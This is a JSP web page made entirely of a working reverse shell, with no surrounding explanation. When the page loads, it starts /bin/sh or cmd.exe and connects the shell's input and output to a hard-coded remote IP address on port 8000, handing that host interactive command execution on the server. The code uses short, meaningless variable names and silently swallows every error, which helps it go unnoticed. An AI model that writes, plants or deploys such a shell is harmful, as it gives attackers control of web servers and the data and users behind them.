<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream gg;
    OutputStream zp;

    StreamConnector( InputStream gg, OutputStream zp )
    {
      this.gg = gg;
      this.zp = zp;
    }

    public void run()
    {
      BufferedReader hg  = null;
      BufferedWriter jqk = null;
      try
      {
        hg  = new BufferedReader( new InputStreamReader( this.gg ) );
        jqk = new BufferedWriter( new OutputStreamWriter( this.zp ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = hg.read( buffer, 0, buffer.length ) ) > 0 )
        {
          jqk.write( buffer, 0, length );
          jqk.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( hg != null )
          hg.close();
        if( jqk != null )
          jqk.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "52.130.254.118", 8000 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
